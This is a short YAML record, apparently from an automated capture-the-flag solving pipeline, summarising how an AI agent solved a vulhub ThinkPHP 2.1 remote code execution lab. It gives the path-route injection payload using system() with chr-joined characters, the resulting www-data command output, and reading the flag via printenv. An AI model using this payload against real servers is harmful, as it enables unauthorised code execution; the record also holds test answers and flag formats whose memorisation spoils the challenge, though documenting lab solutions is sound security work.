@@ -1,0 +1,22 @@
+name: '[ThinkPHP]2-Rce'
+category: web
+keywords:
+- thinkphp
+- rce
+- github
+- vulhub
+- tree
+- master
+steps:
+- '[claude] ThinkPHP2.1 path-route RCE works: `GET /index.php/Index/index/name/${@system(chr(..).chr(..))}`
+  → `id` returns `uid=33(www-data)`. Payload chars must be chr-joined with no trailing
+  dot.'
+- '[claude] `printenv` returned `FLAG=CTF2{...}` in the Apache process env; no flag
+  file needed.'
+- '[claude] FOUND_FLAG=<FLAG>'
+- Native Worker completed a bounded evidence-backed observation
+evidence_chain:
+- '[claude] FOUND_FLAG=<FLAG>'
+success_format: CTF2\{[^}]+\}
+source: 77960ed5-23ba-49a9-a4e6-ba52b7484a92 (solver 0e75f5a6-e7b1-4b8d-8793-e3228151ebf1)
+notes: ''
